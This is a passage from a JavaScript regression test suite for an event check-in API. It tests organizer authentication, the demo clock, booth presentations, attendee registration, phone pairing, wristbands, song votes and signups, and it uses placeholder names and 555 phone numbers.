  retryingExporter.queueImmediate();
  const recoveredStatus = await retryingExporter.flush();
  assert.equal(retryAttempts, 2);
  assert.equal(recoveredStatus.state, "idle");
  assert.equal(recoveredStatus.pending, false);
  assert.equal(recoveredStatus.lastError, null);
  assert.equal(recoveredStatus.nextRetryAt, null);
  assert.deepEqual(recoveredStatus.lastRowCounts, expectedCounts);
}

async function runGoogleSheetsExportApiRegression(port) {
  const organizerKey = "test-organizer-key";
  let response = await request(port, "googleSheetsExportStatus", {});
  assert.equal(response.status, 401);
  assert.equal(response.body.code, "AUTH_REQUIRED");
  response = await request(port, "googleSheetsExportStatus", { organizerKey: "wrong" });
  assert.equal(response.status, 401);
  assert.equal(response.body.code, "AUTH_REQUIRED");

  response = await request(port, "googleSheetsExportStatus", { organizerKey });
  assert.equal(response.status, 200);
  assert.deepEqual(Object.keys(response.body).sort(), EXPECTED_SHEETS_STATUS_KEYS);
  assert.equal(response.body.configured, false);
  assert.equal(response.body.state, "disabled");
  const protectedStatus = response.body;
  ["url", "endpoint", "key", "secret", "exportKey"].forEach((field) => {
    assert.equal(Object.prototype.hasOwnProperty.call(protectedStatus, field), false);
  });

  response = await request(port, "syncGoogleSheetsExport", {});
  assert.equal(response.status, 401);
  assert.equal(response.body.code, "AUTH_REQUIRED");
  response = await request(port, "syncGoogleSheetsExport", { organizerKey: "wrong" });
  assert.equal(response.status, 401);
  assert.equal(response.body.code, "AUTH_REQUIRED");
  response = await request(port, "syncGoogleSheetsExport", { organizerKey });
  assert.equal(response.status, 409);
  assert.equal(response.body.code, "GOOGLE_SHEETS_EXPORT_NOT_CONFIGURED");

  response = await request(port, "dashboardData", { organizerKey });
  assert.equal(response.status, 200);
  assert.deepEqual(response.body.googleSheetsExport, protectedStatus);
  assert.deepEqual(Object.keys(response.body.googleSheetsExport).sort(), EXPECTED_SHEETS_STATUS_KEYS);
  const dashboardExportText = JSON.stringify(response.body.googleSheetsExport).toLowerCase();
  ["webhook", "endpoint", "exportkey", "secret"].forEach((forbidden) => {
    assert.equal(dashboardExportText.includes(forbidden), false);
  });
}

async function runApiRegression(port) {
  const organizerKey = "test-organizer-key";

  let res = await request(port, "dashboardData", {});
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  assert.equal("totals" in res.body, false);

  res = await request(port, "verifyOrganizer", { organizerKey: "wrong" });
  assert.equal(res.status, 401);
  res = await request(port, "verifyOrganizer", { organizerKey });
  assert.deepEqual(res.body, { ok: true });

  res = await rawRequest(port, "eventClock", "{not-json", { "Content-Type": "application/json" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_JSON");
  res = await rawRequest(
    port,
    "eventClock",
    JSON.stringify({ padding: "x".repeat(65 * 1024) }),
    { "Content-Type": "application/json" }
  );
  assert.equal(res.status, 413);
  assert.equal(res.body.code, "REQUEST_TOO_LARGE");

  // The local rehearsal clock is public but contains no attendee or organizer
  // data. Only the organizer can move it, and an anchored preset keeps ticking
  // for every browser instead of freezing at a screenshot-like instant.
  res = await request(port, "eventClock", {});
  assert.equal(res.status, 200);
  assert.deepEqual(Object.keys(res.body).sort(), [
    "controlled", "dataResetAt", "mode", "serverNow", "targetIso", "updatedAt",
  ]);
  assert.equal(res.body.mode, "live");
  assert.equal(res.body.controlled, false);
  assert.equal(res.body.targetIso, null);
  assertIsoTimestamp(res.body.dataResetAt, "initial API data-reset marker");
  assertIsoTimestamp(res.body.updatedAt, "initial demo clock updatedAt");
  assertIsoTimestamp(res.body.serverNow, "initial demo clock serverNow");

  res = await request(port, "setDemoClock", {
    mode: "session1", targetIso: "2026-07-18T20:15:00.000Z", organizerKey: "wrong",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await request(port, "setDemoClock", { mode: "not-a-mode", organizerKey });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_DEMO_CLOCK_MODE");
  res = await request(port, "setDemoClock", { mode: "session1", targetIso: "not-a-date", organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.targetIso, "2026-07-18T20:15:00.000Z");
  res = await request(port, "setDemoClock", { mode: "custom", targetIso: "not-a-date", organizerKey });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_DEMO_CLOCK_TARGET");
  for (const targetIso of [
    "2026-07-18T20:09:59.999Z",
    "2026-07-18T21:00:01.000Z",
  ]) {
    res = await request(port, "setDemoClock", { mode: "custom", targetIso, organizerKey });
    assert.equal(res.status, 400, targetIso);
    assert.equal(res.body.code, "INVALID_DEMO_CLOCK_TARGET_RANGE", targetIso);
  }

  const customTarget = "2026-07-18T20:42:17.000Z";
  res = await request(port, "setDemoClock", { mode: "custom", targetIso: customTarget, organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.mode, "custom");
  assert.equal(res.body.controlled, true);
  assert.equal(res.body.targetIso, customTarget);
  const firstCustomMs = Date.parse(res.body.serverNow);
  await new Promise((resolve) => setTimeout(resolve, 10));
  res = await request(port, "eventClock", undefined, "GET");
  assert.ok(Date.parse(res.body.serverNow) > firstCustomMs, "custom demo time should tick forward");
  for (const boundaryTarget of [
    "2026-07-18T20:10:00.000Z",
    "2026-07-18T20:55:00.000Z",
    "2026-07-18T21:00:00.000Z",
  ]) {
    res = await request(port, "setDemoClock", {
      mode: "custom", targetIso: boundaryTarget, organizerKey,
    });
    assert.equal(res.status, 200, boundaryTarget);
    assert.equal(res.body.targetIso, boundaryTarget, boundaryTarget);
  }

  const anchoredTarget = "2026-07-18T20:15:00.000Z";
  res = await request(port, "setDemoClock", { mode: "session1", targetIso: anchoredTarget, organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.mode, "session1");
  assert.equal(res.body.controlled, true);
  assert.equal(res.body.targetIso, anchoredTarget);
  assertIsoTimestamp(res.body.updatedAt, "demo clock updatedAt");
  const firstAnchoredMs = Date.parse(res.body.serverNow);
  await new Promise((resolve) => setTimeout(resolve, 10));
  res = await request(port, "eventClock", undefined, "GET");
  assert.equal(res.status, 200);
  assert.equal(res.body.mode, "session1");
  assert.ok(Date.parse(res.body.serverNow) > firstAnchoredMs, "anchored demo clock should tick forward");

  const namedClockTargets = new Map([
    ["before", "2026-07-18T20:05:00.000Z"],
    ["session1-start", "2026-07-18T20:10:00.000Z"],
    ["session1-final15", "2026-07-18T20:29:45.000Z"],
    ["session2", "2026-07-18T20:35:00.000Z"],
    ["session2-final15", "2026-07-18T20:49:45.000Z"],
    ["waiting", "2026-07-18T20:55:00.000Z"],
    ["ended", "2026-07-18T21:00:00.000Z"],
  ]);
  for (const [mode, expectedTargetIso] of namedClockTargets) {
    res = await request(port, "setDemoClock", {
      mode,
      targetIso: "2026-07-18T20:11:11.000Z",
      organizerKey,
    });
    assert.equal(res.status, 200, mode);
    assert.equal(res.body.mode, mode);
    assert.equal(res.body.targetIso, expectedTargetIso, `${mode} must use its server-owned schedule point`);
  }
  for (const removedMode of ["session3", "session3-final15"]) {
    res = await request(port, "setDemoClock", {
      mode: removedMode,
      targetIso: "2026-07-18T20:55:00.000Z",
      organizerKey,
    });
    assert.equal(res.status, 400, removedMode);
    assert.equal(res.body.code, "INVALID_DEMO_CLOCK_MODE", removedMode);
  }

  // The ten-minute handoff window is distinct from both booth rotations and
  // the 4:00 PM message. These exact boundaries drive every attendee portal.
  for (const [targetIso, expectedPhase] of [
    ["2026-07-18T20:50:00.000Z", "waiting"],
    ["2026-07-18T20:59:59.000Z", "waiting"],
    ["2026-07-18T21:00:00.000Z", "ended"],
  ]) {
    res = await request(port, "setDemoClock", { mode: "custom", targetIso, organizerKey });
    assert.equal(res.status, 200, targetIso);
    res = await request(port, "dashboardData", { organizerKey });
    assert.equal(res.status, 200, targetIso);
    assert.equal(res.body.eventState.phase, expectedPhase, targetIso);
    assert.equal(res.body.eventState.sessionNumber, null, targetIso);
  }
  const liveClockRequestStartedAt = Date.now();
  res = await request(port, "setDemoClock", { mode: "live", targetIso: null, organizerKey });
  const liveClockRequestFinishedAt = Date.now();
  assert.equal(res.status, 200);
  assert.equal(res.body.mode, "live");
  assert.equal(res.body.controlled, true);
  assert.equal(res.body.targetIso, null);
  const firstLiveClockMs = Date.parse(res.body.serverNow);
  assert.ok(
    firstLiveClockMs >= liveClockRequestStartedAt - 1000
      && firstLiveClockMs <= liveClockRequestFinishedAt + 1000,
    "live mode must return the real server clock rather than a rehearsal anchor"
  );
  await new Promise((resolve) => setTimeout(resolve, 10));
  res = await request(port, "eventClock", undefined, "GET");
  assert.equal(res.body.mode, "live");
  assert.ok(Date.parse(res.body.serverNow) > firstLiveClockMs, "live server time should keep ticking");
  const liveClockUpdatedAt = res.body.updatedAt;

  // Booth presentation state is public and PII-free. Each booth starts with
  // an independent waiting state; only an authenticated organizer can change
  // the state for the booth they name.
  res = await request(port, "boothPresentation", { boothId: "story" });
  assert.equal(res.status, 200);
  assert.equal(res.body.boothId, "story");
  assert.equal(res.body.stepIndex, 0);
  assert.equal(res.body.status, "waiting");
  assert.equal(res.body.message, "");
  assert.equal(res.body.version, 0);
  assert.equal(res.body.createdAt, null);
  assert.equal(res.body.updatedAt, null);
  assertIsoTimestamp(res.body.serverNow, "booth presentation serverNow");
  assert.equal("recentCheckins" in res.body, false);

  res = await request(port, "boothPresentation", { boothId: "unknown" });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "BOOTH_NOT_FOUND");
  res = await request(port, "updateBoothPresentation", {
    boothId: "story", stepIndex: 1, status: "live", message: "Begin", organizerKey: "wrong",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await request(port, "updateBoothPresentation", {
    boothId: "story", stepIndex: 1, status: "not-a-status", message: "Begin", organizerKey,
  });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_PRESENTATION_STATUS");
  res = await request(port, "updateBoothPresentation", {
    boothId: "story", stepIndex: 1, status: "live", message: "x".repeat(501), organizerKey,
  });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_PRESENTATION_MESSAGE");

  res = await request(port, "updateBoothPresentation", {
    boothId: "story", stepIndex: 2, status: "live", message: "  Start the story now.  ", organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.boothId, "story");
  assert.equal(res.body.stepIndex, 2);
  assert.equal(res.body.status, "live");
  assert.equal(res.body.message, "", "The Heaven Booth must ignore free-text announcements");
  assert.equal(res.body.version, 1);
  assertIsoTimestamp(res.body.createdAt, "presentation createdAt");
  assertIsoTimestamp(res.body.updatedAt, "presentation updatedAt");
  assertIsoTimestamp(res.body.serverNow, "presentation update serverNow");
  const presentationCreatedAt = res.body.createdAt;

  res = await request(port, "updateBoothPresentation", {
    boothId: "story", stepIndex: 4, status: "wrap", message: "Stale", version: 0, organizerKey,
  });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "PRESENTATION_CONFLICT");

  res = await request(port, "boothPresentation", { boothId: "heaven" });
  assert.equal(res.status, 200);
  assert.equal(res.body.boothId, "heaven");
  assert.equal(res.body.version, 0);
  assert.equal(res.body.status, "waiting");
  res = await request(port, "updateBoothPresentation", {
    boothId: "story", stepIndex: 3, status: "paused", message: "Hold here.", version: 1, organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.version, 2);
  assert.equal(res.body.createdAt, presentationCreatedAt);
  assert.equal(res.body.status, "paused");
  assert.equal(res.body.message, "");

  for (const invalidPhone of ["615555010", "16155550101"]) {
    res = await request(port, "findOrRegisterByPhone", {
      phone: invalidPhone,
      name: "Invalid",
      allowCreate: true,
      organizerKey,
    });
    assert.equal(res.status, 400);
    assert.equal(res.body.code, "INVALID_PHONE");
  }

  for (const invalidPhone of ["615555010", "16155550101"]) {
    res = await request(port, "registerAttendee", {
      attendeeId: `invalid-registration-${invalidPhone}`,
      name: "Invalid",
      phone: invalidPhone,
    });
    assert.equal(res.status, 400);
    assert.equal(res.body.code, "INVALID_PHONE");
  }

  res = await request(port, "registerAttendee", {
    attendeeId: "entry-a", name: "Avery", phone: "615-555-0101",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.raffleNumber, "1001");
  assert.equal(res.body.phoneLinked, true);
  assert.equal(res.body.isNew, true);
  assertIsoTimestamp(res.body.dataResetAt, "registration data-reset marker");
  assert.equal("phone" in res.body, false);
  assert.equal("phoneVerified" in res.body, false);

  let registrationDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.equal(registrationDb.attendees.length, 1);
  assert.equal(registrationDb.attendees[0].phone, "6155550101");
  assert.equal("otpChallenges" in registrationDb, false);
  assert.equal("phoneVerifiedAt" in registrationDb.attendees[0], false);
  assert.equal("phoneVerificationRequired" in registrationDb.attendees[0], false);

  // A repeated submit is idempotent, and a different browser using the same
  // name + phone pair recovers the canonical attendee rather than creating one.
  res = await request(port, "registerAttendee", {
    attendeeId: "entry-a", name: "  Avery ", phone: "6155550101",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.isNew, false);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.raffleNumber, "1001");

  res = await request(port, "registerAttendee", {
    attendeeId: "another-device", name: "  Avery  ", phone: "6155550101",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.isNew, false);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.raffleNumber, "1001");
  registrationDb = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.equal(registrationDb.attendees.length, 1);
  assert.deepEqual(registrationDb.attendees[0].aliasIds, ["another-device"]);

  for (const conflictingIdentity of [
    { name: "Somebody Else", phone: "6155550101" },
    { name: "Avery", phone: "6155550199" },
  ]) {
    res = await request(port, "registerAttendee", {
      attendeeId: "entry-a",
      ...conflictingIdentity,
    });
    assert.equal(res.status, 409);
    assert.equal(res.body.code, "ATTENDEE_IDENTITY_CONFLICT");
  }

  for (const retiredAction of [
    "startAttendeeRegistration",
    "verifyAttendeePhone",
    "resendAttendeePhoneCode",
  ]) {
    res = await request(port, retiredAction, {});
    assert.equal(res.status, 404);
    assert.match(res.body.error, /unknown action/);
  }

  res = await request(port, "saveSongVote", { attendeeId: "entry-a", songTitle: "Not a real option" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_SONG_CHOICE");
  for (const retiredTitle of ["God in me", "Jireh", "Way Maker"]) {
    res = await request(port, "saveSongVote", { attendeeId: "entry-a", songTitle: retiredTitle });
    assert.equal(res.status, 400, retiredTitle);
    assert.equal(res.body.code, "INVALID_SONG_CHOICE", retiredTitle);
  }
  res = await request(port, "saveSongVote", { attendeeId: "missing-voter", songTitle: "Victory" });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "ATTENDEE_NOT_FOUND");
  res = await request(port, "saveSongVote", { attendeeId: "entry-a", songTitle: "Victory" });
  assert.equal(res.status, 200);
  assert.equal(res.body.votes, 1);
  assert.equal(res.body.totalVotes, 1);
  res = await request(port, "saveSongVote", { attendeeId: "entry-a", songTitle: "Victory" });
  assert.equal(res.status, 200);
  assert.equal(res.body.votes, 1);
  assert.equal(res.body.totalVotes, 1);
  res = await request(port, "dashboardData", { organizerKey });
  assert.equal("songVotes" in res.body, false);
  assert.equal("triviaLeaderboard" in res.body, false);

  res = await request(port, "loginAttendee", {
    name: "  aVeRy  ",
    phone: "(615) 555-0101",
    portal: "phase2",
  });
  assert.equal(res.status, 403);
  assert.equal(res.body.code, "PHASE1_INCOMPLETE");

  res = await request(port, "loginAttendee", {
    name: "  aVeRy  ",
    phone: "6155550101",
    portal: "phase3",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.name, "Avery");
  assert.equal(res.body.raffleNumber, "1001");
  assert.equal(res.body.wristbandConfirmed, false);
  assert.equal(res.body.wristbandColor, null);
  assert.equal(res.body.phoneLinked, true);
  assert.equal("phoneVerified" in res.body, false);
  assert.equal(res.body.phase3CompletedAt, null);
  assertIsoTimestamp(res.body.serverNow, "attendee login serverNow");
  assert.equal("phone" in res.body, false);

  res = await request(port, "loginAttendee", {
    name: "Somebody Else",
    phone: "6155550101",
    portal: "phase3",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "ATTENDEE_LOGIN_FAILED");
  assert.equal("attendeeId" in res.body, false);

  res = await request(port, "loginAttendee", { name: "", phone: "" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "LOGIN_FIELDS_REQUIRED");
  assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).attendees.length, 1);

  res = await request(port, "confirmWristband", { attendeeId: "entry-a" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_WRISTBAND_COLOR");
  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: "purple" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_WRISTBAND_COLOR");
  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: " Blue " });
  assert.equal(res.status, 200);
  assert.equal(res.body.wristbandColor, "blue");
  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: "blue" });
  assert.equal(res.status, 200);
  res = await request(port, "confirmWristband", { attendeeId: "entry-a", wristbandColor: "red" });
  assert.equal(res.status, 409);
  assert.equal(res.body.code, "WRISTBAND_ALREADY_ASSIGNED");
  res = await request(port, "loginAttendee", {
    name: "Avery",
    phone: "6155550101",
    portal: "phase2",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.wristbandConfirmed, true);
  assert.equal(res.body.wristbandColor, "blue");
  assertIsoTimestamp(res.body.serverNow, "phase 2 login serverNow");
  res = await request(port, "attendeePortalSession", { attendeeId: "entry-a", portal: "phase2" });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.wristbandColor, "blue");
  assert.equal(res.body.phase3CompletedAt, null);
  assertIsoTimestamp(res.body.serverNow, "restored session serverNow");

  res = await request(port, "findOrRegisterByPhone", {
    phone: "615-555-0101",
    name: "Guest",
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.isNew, false);

  res = await request(port, "findOrRegisterByPhone", {
    phone: "615-555-0101",
    raffleNumber: "#1001",
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.name, "Avery");
  assert.equal(res.body.raffleNumber, "1001");
  assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).attendees[0].phone, "6155550101");

  res = await request(port, "findOrRegisterByPhone", {
    phone: "615-555-0101",
    raffleNumber: "#1001",
    confirmPairing: true,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-a");
  assert.equal(res.body.raffleNumber, "1001");
  assert.equal(res.body.name, "Avery");
  assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).attendees[0].phone, "6155550101");
  res = await request(port, "attendeePortalSession", { attendeeId: "entry-a", portal: "phase2" });
  assert.equal(res.body.phoneLinked, true);
  assert.equal("phoneVerified" in res.body, false);
  assert.equal("phone" in res.body, false);

  res = await request(port, "boothCheckin", {
    attendeeId: "entry-a",
    phone: "6155550101",
    boothId: "story",
    boothName: "The Heaven Booth",
    checkedInBy: "staff-kiosk",
  });
  assert.equal(res.status, 401);

  res = await request(port, "boothCheckin", {
    attendeeId: "entry-a",
    phone: "6155550101",
    boothId: "story",
    boothName: "The Heaven Booth",
    checkedInBy: "staff-kiosk",
    organizerKey,
  });
  assert.equal(res.status, 200);
  const storyCheckinId = res.body.checkinId;
  const originalStoryCheckedInAt = "2026-07-18T20:10:00.000Z";
  const dbWithStoryCheckin = JSON.parse(fs.readFileSync(testDb, "utf8"));
  dbWithStoryCheckin.boothCheckins.find((checkin) => checkin.id === storyCheckinId).checkedInAt = originalStoryCheckedInAt;
  fs.writeFileSync(testDb, JSON.stringify(dbWithStoryCheckin, null, 2));

  res = await request(port, "boothCheckin", {
    attendeeId: "entry-a",
    phone: "6155550101",
    boothId: "story",
    boothName: "The Heaven Booth",
    checkedInBy: "capacity-test",
    rating: 4,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.checkinId, storyCheckinId);
  assert.equal(res.body.updated, true);
  const storyRows = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
    .filter((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "story");
  assert.equal(storyRows.length, 1);
  assert.equal(storyRows[0].rating, 4);
  assert.equal(storyRows[0].checkedInAt, originalStoryCheckedInAt);
  res = await request(port, "boothCheckin", {
    attendeeId: "entry-a",
    boothId: "story",
    boothName: "The Heaven Booth",
    checkedInBy: "capacity-test",
    extraData: { sessionNumber: 2, wristbandColor: "blue" },
  });
  assert.equal(res.status, 200);
  const mergedStoryRow = JSON.parse(fs.readFileSync(testDb, "utf8")).boothCheckins
    .find((checkin) => checkin.attendeeId === "entry-a" && checkin.boothId === "story");
  assert.equal(mergedStoryRow.rating, 4);
  assert.equal(mergedStoryRow.extraData.sessionNumber, 2);
  assert.equal(mergedStoryRow.checkedInAt, originalStoryCheckedInAt);

  res = await request(port, "myCheckins", { phone: "6155550101" });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "ATTENDEE_ID_REQUIRED");
  assert.equal("attendee" in res.body, false);

  res = await request(port, "myCheckins", { attendeeId: "entry-a" });
  assert.deepEqual(res.body.boothIds, ["story"]);
  assert.deepEqual(Object.keys(res.body), ["boothIds"]);

  // A visitor who truly skipped entry can be created explicitly at a kiosk.
  res = await request(port, "findOrRegisterByPhone", {
    phone: "6155550202",
    name: "Guest",
    allowCreate: true,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.raffleNumber, "1002");
  const kioskOnlyId = res.body.attendeeId;

  await request(port, "boothCheckin", {
    attendeeId: kioskOnlyId,
    phone: "6155550202",
    boothId: "newsong",
    boothName: "The New Song in Nashville",
    checkedInBy: "staff-kiosk",
    organizerKey,
  });
  res = await request(port, "mySignupSelections", { attendeeId: kioskOnlyId });
  assert.deepEqual(res.body.optionIds, []);
  assert.equal(res.body.completedAt, null);
  res = await request(port, "saveSignupSelections", { attendeeId: kioskOnlyId, optionIds: [] });
  assert.deepEqual(res.body.optionIds, []);
  assertIsoTimestamp(res.body.completedAt, "merged attendee Phase 3 completedAt");
  const kioskPhase3CompletedAt = res.body.completedAt;

  // If that visitor later registers at entry, staff pair their shown raffle
  // with the phone. The entry record wins and prior kiosk activity migrates.
  res = await request(port, "registerAttendee", {
    attendeeId: "entry-c", name: "Casey", organizerKey,
  });
  assert.equal(res.body.raffleNumber, "1003");
  res = await request(port, "findOrRegisterByPhone", {
    phone: "6155550202",
    raffleNumber: "1003",
    organizerKey,
  });
  assert.equal(res.body.requiresPairingConfirmation, true);
  let dbBeforeConfirmedMerge = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.equal(dbBeforeConfirmedMerge.attendees.length, 3);
  assert.equal(dbBeforeConfirmedMerge.boothCheckins.find((c) => c.boothId === "newsong").attendeeId, kioskOnlyId);

  res = await request(port, "findOrRegisterByPhone", {
    phone: "6155550202",
    raffleNumber: "1003",
    confirmPairing: true,
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-c");
  assert.equal(res.body.raffleNumber, "1003");
  assert.equal(res.body.name, "Casey");

  const dbAfterMerge = JSON.parse(fs.readFileSync(testDb, "utf8"));
  assert.equal(dbAfterMerge.attendees.length, 2);
  const casey = dbAfterMerge.attendees.find((a) => a.attendeeId === "entry-c");
  assert.ok(casey.aliasIds.includes(kioskOnlyId));
  assert.equal(casey.phase3CompletedAt, kioskPhase3CompletedAt);
  assert.equal(dbAfterMerge.boothCheckins.find((c) => c.boothId === "newsong").attendeeId, "entry-c");
  res = await request(port, "myCheckins", { attendeeId: kioskOnlyId });
  assert.deepEqual(res.body.boothIds, ["newsong"]);
  res = await request(port, "mySignupSelections", { attendeeId: kioskOnlyId });
  assert.deepEqual(res.body.optionIds, []);
  assert.equal(res.body.completedAt, kioskPhase3CompletedAt);

  res = await request(port, "boothDashboardData", { boothId: "story", organizerKey: "wrong" });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  res = await request(port, "boothDashboardData", { boothId: "unknown", organizerKey });
  assert.equal(res.status, 404);
  assert.equal(res.body.code, "BOOTH_NOT_FOUND");
  res = await request(port, "boothDashboardData", { boothId: "story", organizerKey });
  assert.equal(res.status, 200);
  assert.equal(res.body.boothId, "story");
  assert.equal(res.body.totalCheckins, 1);
  assert.deepEqual(res.body.recentCheckins.map((checkin) => checkin.name), ["Avery"]);
  assert.equal("phone" in res.body.recentCheckins[0], false);
  assert.equal("signups" in res.body, false);
  assert.equal(res.body.presentation.boothId, "story");
  assert.equal(res.body.presentation.stepIndex, 3);
  assert.equal(res.body.presentation.status, "paused");
  assert.equal(res.body.presentation.message, "");
  assert.equal(res.body.presentation.version, 2);
  assertIsoTimestamp(res.body.serverNow, "booth dashboard serverNow");
  res = await request(port, "boothDashboardData", { boothId: "newsong", organizerKey });
  assert.equal(res.body.totalCheckins, 1);
  assert.deepEqual(res.body.recentCheckins.map((checkin) => checkin.name), ["Casey"]);
  assert.deepEqual(res.body.songVotes, [{ title: "Victory", votes: 1 }]);
  assert.equal(res.body.presentation.boothId, "newsong");
  assert.equal(res.body.presentation.version, 0);

  // Legacy record creation and phone pairing are staff-only. A public caller
  // cannot claim a phone or receive attendee details.
  res = await request(port, "registerAttendee", {
    attendeeId: "entry-d", name: "Drew", organizerKey,
  });
  assert.equal(res.body.raffleNumber, "1004");
  res = await request(port, "findOrRegisterByPhone", {
    attendeeId: "entry-d",
    phone: "6155550101",
    name: "Drew",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");
  assert.equal("name" in res.body, false);
  assert.equal("raffleNumber" in res.body, false);

  res = await request(port, "findOrRegisterByPhone", {
    attendeeId: "entry-d",
    phone: "6155550404",
    name: "Drew",
    organizerKey,
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.attendeeId, "entry-d");

  res = await request(port, "mySignupSelections", { attendeeId: "entry-d" });
  assert.deepEqual(res.body.optionIds, []);
  assert.equal(res.body.completedAt, null);
  res = await request(port, "attendeePortalSession", { attendeeId: "entry-d", portal: "phase3" });
  assert.equal(res.body.phase3CompletedAt, null);

  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: ["invalid"] });
  assert.equal(res.status, 400);
  assert.equal(res.body.code, "INVALID_SIGNUP_OPTIONS");
  res = await request(port, "mySignupSelections", { attendeeId: "entry-d" });
  assert.equal(res.body.completedAt, null);

  // Clicking the no-thanks finish action is completion even though it creates
  // no SignUps row. Later selection edits retain this first completion time.
  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: [] });
  assert.deepEqual(res.body.optionIds, []);
  assertIsoTimestamp(res.body.completedAt, "Phase 3 completedAt after empty save");
  const drewPhase3CompletedAt = res.body.completedAt;
  assert.equal(
    JSON.parse(fs.readFileSync(testDb, "utf8")).signups.some((signup) => signup.attendeeId === "entry-d"),
    false
  );
  res = await request(port, "mySignupSelections", { attendeeId: "entry-d" });
  assert.deepEqual(res.body.optionIds, []);
  assert.equal(res.body.completedAt, drewPhase3CompletedAt);
  res = await request(port, "attendeePortalSession", { attendeeId: "entry-d", portal: "phase3" });
  assert.equal(res.body.phase3CompletedAt, drewPhase3CompletedAt);

  await new Promise((resolve) => setTimeout(resolve, 5));
  res = await request(port, "saveSignupSelections", {
    attendeeId: "entry-d",
    optionIds: ["future", "art", "future"],
  });
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.optionIds, ["future", "art"]);
  assert.equal(res.body.completedAt, drewPhase3CompletedAt);
  const drewArtSignupId = res.body.signupIds[1];
  res = await request(port, "mySignupSelections", { attendeeId: "entry-d" });
  assert.deepEqual(res.body.optionIds, ["future", "art"]);
  assert.equal(res.body.completedAt, drewPhase3CompletedAt);
  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: ["art"] });
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.optionIds, ["art"]);
  assert.equal(res.body.signupIds[0], drewArtSignupId);
  assert.equal(res.body.completedAt, drewPhase3CompletedAt);
  res = await request(port, "saveSignupSelections", { attendeeId: "entry-d", optionIds: [] });
  assert.deepEqual(res.body.optionIds, []);
  assert.equal(res.body.completedAt, drewPhase3CompletedAt);
  res = await request(port, "mySignupSelections", { attendeeId: "entry-d" });
  assert.deepEqual(res.body.optionIds, []);
  assert.equal(res.body.completedAt, drewPhase3CompletedAt);

  // The legacy phone-linking endpoint is not available to self-service pages,
  // so an incomplete entry cannot create a hidden raffle record.
  res = await request(port, "findOrRegisterByPhone", {
    attendeeId: "missing-public-id",
    phone: "6155550999",
    name: "Bypass",
  });
  assert.equal(res.status, 401);
  assert.equal(res.body.code, "AUTH_REQUIRED");

  res = await request(port, "submitSignup", {
    attendeeId: "entry-a",
    phone: "6155550101",
    optionId: "future",
    optionTitle: "Future events",
  });
  const signupId = res.body.signupId;
  assert.equal(res.body.updated, undefined);
  res = await request(port, "submitSignup", {
    attendeeId: "entry-a",
    phone: "(615) 555-0101",
    optionId: "future",
    optionTitle: "Keep me posted on future events",
  });
  assert.equal(res.status, 200);
  assert.equal(res.body.signupId, signupId);
  assert.equal(res.body.updated, true);
  assert.equal(JSON.parse(fs.readFileSync(testDb, "utf8")).signups.length, 1);
  res = await request(port, "submitSignup", {
    attendeeId: "entry-a",
    phone: "(615) 555-0101",
    optionId: "bible",
    optionTitle: "One-on-one Bible study",
  });
  const secondSignupId = res.body.signupId;
  res = await request(port, "submitSignup", {
